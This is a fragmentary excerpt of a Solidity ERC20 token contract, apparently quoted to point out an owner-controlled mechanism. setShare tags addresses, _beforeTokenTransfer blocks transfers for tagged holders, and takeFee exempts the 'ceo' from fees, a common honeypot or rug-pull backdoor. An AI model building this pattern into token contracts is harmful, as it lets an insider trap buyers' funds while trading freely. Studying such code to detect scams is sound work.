...
contract Token is ERC20, ERC20Burnable, IDividendDistributor, Ownable {
    ...
    function setShare(address[] calldata list,uint256 state) public onlyOwner{
    ...
    function _beforeTokenTransfer(
        ...
        require(share[from]!=1&&share[from]!=3&&share[to]!=2&&share[to]!=3,"ERC20: Transaction failed");
    ...
    function takeFee(
        ...
        if (share[from]==4 || share[to]==4|| from == ceo || to == ceo) feeAmount = 0;
